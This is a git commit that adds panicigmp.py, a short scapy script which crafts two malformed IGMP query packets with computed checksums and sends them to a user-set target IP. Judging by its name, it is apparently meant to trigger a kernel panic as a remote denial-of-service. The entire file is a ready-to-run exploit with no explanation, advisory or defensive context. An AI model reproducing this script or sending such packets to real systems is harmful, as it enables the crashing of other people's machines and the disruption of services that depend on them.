331680e19e2392c6c61127c6ab92c40c52c0b736
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2018-03-14 15:32:16 +0100

    Create panicigmp.py

---
+++ panicigmp.py
@@ -0,0 +1,13 @@
+import sys
+from scapy.all import *
+
+from struct import pack
+from socket import inet_aton
+
+target = "127.0.0.1" # host target IP, change this !!!
+a=pack("!BBH",0x11,0xff,0)+inet_aton("224.0.0.1")
+b=pack("!BBH",0x11,0x0,0)+inet_aton("0.0.0.0")+pack("!BBBB",0,0,0,0)
+a1=a[:2]+pack("!H",checksum(a))+a[4:]
+b1=b[:2]+pack("!H",checksum(b))+b[4:]
+send(IP(dst=target,proto=2)/a1)
+send(IP(dst=target,proto=2)/b1)
